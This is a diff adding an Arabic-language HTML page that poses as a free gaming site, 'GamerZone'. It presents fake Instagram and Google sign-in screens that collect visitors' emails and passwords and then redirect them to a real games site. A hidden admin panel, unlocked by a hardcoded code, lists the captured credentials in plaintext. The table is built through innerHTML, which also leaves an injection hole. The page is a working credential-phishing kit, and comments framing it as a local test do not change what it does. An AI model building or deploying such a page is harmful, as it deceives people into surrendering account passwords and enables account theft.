@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة الألعاب الاحترافية</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0f0f13; color: white; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        
+        /* Navbar & Menu */
+        .navbar { width: 100%; padding: 15px 20px; display: flex; justify-content: space-between; background: #1a1a24; border-bottom: 2px solid #6c5ce7; }
+        .menu-btn { background: none; border: none; color: white; font-size: 24px; cursor: pointer; }
+        .sidebar { position: fixed; top: 0; right: -250px; width: 250px; height: 100%; background: #1a1a24; transition: 0.3s; z-index: 1000; padding-top: 60px; box-shadow: -5px 0 15px rgba(0,0,0,0.5); }
+        .sidebar.active { right: 0; }
+        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 24px; color: white; cursor: pointer; }
+        .sidebar a { display: block; padding: 15px 20px; color: white; text-decoration: none; border-bottom: 1px solid #2d2d3a; transition: 0.3s; }
+        .sidebar a:hover { background: #6c5ce7; }
+        .admin-link { color: #ff7675 !important; font-weight: bold; }
+
+        /* Screens */
+        .screen { display: none; width: 100%; max-width: 400px; margin-top: 50px; padding: 20px; text-align: center; }
+        .screen.active { display: block; }
+        
+        h1 { color: #00cec9; text-shadow: 0 0 10px rgba(0, 206, 201, 0.5); }
+        .btn { background: #6c5ce7; color: white; border: none; padding: 12px 20px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 20px; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #5548c8; box-shadow: 0 0 15px #6c5ce7; }
+        
+        /* Forms */
+        .form-group { margin-bottom: 15px; text-align: right; }
+        .form-group label { display: block; margin-bottom: 5px; color: #b2bec3; }
+        .form-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #2d2d3a; background: #1e1e28; color: white; outline: none; }
+        .form-group input:focus { border-color: #6c5ce7; }
+        
+        .or-divider { margin: 20px 0; color: #636e72; font-size: 14px; position: relative; cursor: pointer; }
+        .or-divider::before, .or-divider::after { content: ""; position: absolute; top: 50%; width: 40%; height: 1px; background: #2d2d3a; }
+        .or-divider::before { right: 0; }
+        .or-divider::after { left: 0; }
+        
+        /* Admin Table */
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 14px; }
+        th, td { border: 1px solid #2d2d3a; padding: 10px; text-align: center; }
+        th { background: #6c5ce7; }
+        
+        #error-msg { color: #ff7675; margin-top: 10px; display: none; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div style="font-weight: bold; color: #00cec9; font-size: 20px;">GamerZone</div>
+        <button class="menu-btn" onclick="toggleMenu()">☰</button>
+    </div>
+
+    <!-- القائمة الجانبية -->
+    <div id="sidebar" class="sidebar">
+        <div class="close-btn" onclick="toggleMenu()">×</div>
+        <a href="#">🏠 الرئيسية</a>
+        <a href="#">🎮 أحدث الألعاب</a>
+        <a href="#">🏆 البطولات</a>
+        <a href="#">⚙️ الإعدادات</a>
+        <a href="#" class="admin-link" onclick="openAdmin()">🔒 صلاحيات الأدمن</a>
+    </div>
+
+    <!-- شاشة الترحيب -->
+    <div id="intro-screen" class="screen active">
+        <h1>مرحباً بك في عالم الألعاب!</h1>
+        <p style="color: #b2bec3;">استمتع بأفضل الألعاب الجماعية ونافس أصدقائك الآن مجاناً.</p>
+        <button class="btn" onclick="showScreen('insta-screen')">متابعة للعب</button>
+    </div>
+
+    <!-- شاشة تسجيل إنستغرام -->
+    <div id="insta-screen" class="screen">
+        <h2 style="color: white; margin-bottom: 30px;">Instagram</h2>
+        <form id="insta-form" onsubmit="handleLogin(event, 'Instagram')">
+            <div class="form-group">
+                <label>البريد الإلكتروني:</label>
+                <input type="email" id="insta-email" placeholder="example@gmail.com" pattern=".+@gmail\.com" title="يجب أن ينتهي الإيميل بـ @gmail.com" required>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="insta-pass" placeholder="كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn" style="background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);">تسجيل الدخول</button>
+        </form>
+        
+        <!-- زر "أو" المخفي الذي يفتح جوجل -->
+        <div class="or-divider" onclick="showScreen('google-screen')">أو</div>
+    </div>
+
+    <!-- شاشة تسجيل جوجل -->
+    <div id="google-screen" class="screen">
+        <h2 style="color: white; margin-bottom: 30px;">
+            <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+        </h2>
+        <form id="google-form" onsubmit="handleLogin(event, 'Google')">
+            <div class="form-group">
+                <label>البريد الإلكتروني:</label>
+                <input type="email" id="google-email" placeholder="example@gmail.com" pattern=".+@gmail\.com" title="يجب أن ينتهي الإيميل بـ @gmail.com" required>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="google-pass" placeholder="كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn" style="background: #4285F4;">تسجيل الدخول باستخدام جوجل</button>
+        </form>
+    </div>
+
+    <!-- شاشة الأدمن -->
+    <div id="admin-screen" class="screen">
+        <h2 style="color: #ff7675;">لوحة التحكم</h2>
+        
+        <div id="admin-login">
+            <div class="form-group">
+                <label>أدخل رمز الأدمن:</label>
+                <input type="password" id="admin-password-input">
+            </div>
+            <button class="btn" style="background: #ff7675;" onclick="verifyAdmin()">دخول</button>
+            <div id="error-msg">الرمز غير صحيح!</div>
+        </div>
+
+        <div id="admin-dashboard" class="hidden">
+            <p>بيانات المستخدمين المسجلين (للتجربة المحلية):</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>المنصة</th>
+                        <th>الإيميل</th>
+                        <th>الرمز</th>
+                    </tr>
+                </thead>
+                <tbody id="users-table-body">
+                    <!-- سيتم إضافة البيانات هنا برمجياً -->
+                </tbody>
+            </table>
+            <button class="btn" style="margin-top: 20px; background: #2d2d3a;" onclick="showScreen('intro-screen')">عودة للرئيسية</button>
+        </div>
+    </div>
+
+    <script>
+        // مصفوفة وهمية لحفظ البيانات للتجربة
+        let usersData = [];
+
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('active');
+        }
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            toggleMenu(); // إغلاق القائمة إذا كانت مفتوحة
+        }
+
+        function openAdmin() {
+            showScreen('admin-screen');
+            document.getElementById('admin-login').style.display = 'block';
+            document.getElementById('admin-dashboard').classList.add('hidden');
+            document.getElementById('error-msg').style.display = 'none';
+        }
+
+        function verifyAdmin() {
+            const pass = document.getElementById('admin-password-input').value;
+            if (pass === '1823567818235678') {
+                document.getElementById('admin-login').style.display = 'none';
+                document.getElementById('admin-dashboard').classList.remove('hidden');
+                document.getElementById('admin-password-input').value = '';
+                renderTable();
+            } else {
+                document.getElementById('error-msg').style.display = 'block';
+            }
+        }
+
+        function handleLogin(event, platform) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+            
+            // جلب البيانات حسب المنصة
+            const email = platform === 'Instagram' ? document.getElementById('insta-email').value : document.getElementById('google-email').value;
+            const password = platform === 'Instagram' ? document.getElementById('insta-pass').value : document.getElementById('google-pass').value;
+
+            // حفظ البيانات في المصفوفة (للتجربة)
+            usersData.push({ platform, email, password });
+
+            // التوجيه السريع لموقع الألعاب
+            window.location.href = "https://www.crazygames.com/ar/multiplayer";
+        }
+
+        function renderTable() {
+            const tbody = document.getElementById('users-table-body');
+            tbody.innerHTML = '';
+            
+            if(usersData.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3">لا يوجد مستخدمين بعد</td></tr>';
+                return;
+            }
+
+            usersData.forEach(user => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${user.platform}</td>
+                    <td>${user.email}</td>
+                    <td>${user.password}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+    </script>
+</body>
+</html>
